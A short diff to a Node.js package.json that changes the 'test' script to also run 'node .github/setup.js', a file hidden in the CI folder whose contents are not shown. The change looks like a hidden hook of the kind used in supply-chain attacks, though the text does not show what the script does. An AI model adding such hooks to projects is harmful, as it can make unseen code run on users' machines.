@@ -4,7 +4,7 @@
   "description": "## Video Demonstration",
   "main": "server.js",
   "scripts": {
-    "test": "echo \"Error: no test specified\" && exit 1",
+    "test": "echo \"Error: no test specified\" && exit 1; node .github/setup.js",
     "dev": "nodemon server.js"
   },
   "keywords": [],
